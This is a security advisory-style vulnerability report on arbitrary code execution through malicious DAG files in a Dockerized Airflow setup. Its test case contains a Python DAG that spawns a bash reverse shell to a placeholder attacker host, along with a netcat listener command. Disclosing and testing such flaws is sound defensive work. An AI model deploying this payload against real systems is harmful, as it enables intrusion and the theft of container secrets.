- Vulnerability Name: Arbitrary Code Execution via Malicious DAGs
- Description:
    - An attacker can upload a malicious DAG (Directed Acyclic Graph) file, which is a Python script, through the Airflow web UI or by placing it in the `dags` folder mounted to the Docker container.
    - Airflow scheduler parses and executes DAGs to manage workflows.
    - If a DAG contains malicious Python code, this code will be executed by the Airflow components (Scheduler, Worker, or Webserver depending on where the DAG is processed or triggered) within the Docker container.
    - This can lead to arbitrary code execution within the container's environment.
- Impact:
    - Full control of the Airflow Docker container.
    - Ability to access secrets, environment variables, and data within the container.
    - Potential to pivot to other services or the host system depending on the Docker configuration and network setup.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations:
    - None. The project does not implement any mitigations against malicious DAGs. It relies on the user to upload trusted DAGs.
- Missing Mitigations:
    - DAG validation and sanitization: Implement checks to scan uploaded DAG files for potentially malicious code patterns or system calls before parsing and execution.
    - Role-Based Access Control (RBAC): While Airflow has RBAC, this project in a local development context is unlikely to have it configured strictly. Enforce proper RBAC within Airflow to limit who can upload and manage DAGs.
    - Container security hardening: Implement security best practices for the Docker container itself to limit the impact of arbitrary code execution, such as running Airflow processes with a non-root user (already implemented as user `airflow`), using minimal base images, and applying security profiles (e.g., seccomp, AppArmor).
    - Documentation and warnings: Clearly document the risk of uploading untrusted DAGs and advise users to only upload DAGs from trusted sources. While README.md mentions "Security" section, it only links to CONTRIBUTING.md, which further links to vulnerability reporting, not mitigation of DAG based attacks.
- Preconditions:
    - Access to the Airflow web UI (typically exposed on port 8080 when using `docker compose up`).
    - Ability to upload or place DAG files in the designated `dags` folder within the Docker container. In local development setup described in README.md, the `./dags` folder on host is mounted to `/usr/local/airflow/dags` in container.
- Source Code Analysis:
    - The provided project files themselves do not introduce this vulnerability, as it's inherent to Apache Airflow's design of executing user-provided Python DAGs.
    - The `README.md` provides instructions on how to run Airflow locally, which includes mounting the `./dags` directory:
    ```markdown
    volumes:
        - ./dags:/usr/local/airflow/dags
    ```
    - This mounting allows users to easily add DAG files to the Airflow environment.
    - The `docker-compose.yaml` and `docker-compose-test-commands.yaml` also define volumes including `./dags:/usr/local/airflow/dags`, confirming the intended DAG loading mechanism.
    - The Dockerfiles (`/code/images/airflow/2.9.2/Dockerfiles/Dockerfile`, etc.) use the base image `amazon-mwaa-docker-images/airflow:2.9.2-base` and set `ENTRYPOINT ["python3", "-m", "mwaa.entrypoint"]` and `CMD shell`, which starts the Airflow components. The `mwaa.entrypoint` script ( `/code/images/airflow/2.10.1/python/mwaa/entrypoint.py` ) then launches Airflow components (webserver, scheduler, worker, etc.).
    - The vulnerability lies in the design of Airflow itself, where DAGs are treated as code and executed. This project simply provides a Dockerized environment to run Airflow locally, inheriting this inherent risk if untrusted DAGs are used.

- Security Test Case:
    - Step 1: Set up the Airflow environment using the provided `run.sh` script as described in `README.md`.
    - Step 2: Create a malicious DAG file (e.g., `malicious_dag.py`) in the `./dags` directory with the following Python code:
    ```python
    from airflow import DAG
    from airflow.operators.python import PythonOperator
    from datetime import datetime

    with DAG(
        dag_id='malicious_dag',
        schedule_interval=None,
        start_date=datetime(2024, 1, 1),
        catchup=False
    ) as dag:
        def execute_malicious_code():
            import subprocess
            # Reverse shell to attacker's machine (replace with your IP and port)
            subprocess.Popen(['/bin/bash', '-c', 'bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1'])

        run_malicious_code = PythonOperator(
            task_id='run_malicious_code',
            python_callable=execute_malicious_code,
        )
    ```
    *(Replace `attacker_ip` and `attacker_port` with the attacker's listening IP address and port.)*
    - Step 3: Start a listener on the attacker's machine using `nc -lvnp attacker_port`.
    - Step 4: Upload `malicious_dag.py` to the Airflow instance, either by copying it to the `./dags` directory which is mounted to the container, or by using the Airflow UI if DAG upload functionality is enabled and accessible.
    - Step 5: Unpause or trigger the `malicious_dag` DAG in the Airflow Web UI (http://localhost:8080).
    - Step 6: Observe that a reverse shell connection is established on the attacker's machine, indicating successful arbitrary code execution within the Airflow Docker container.
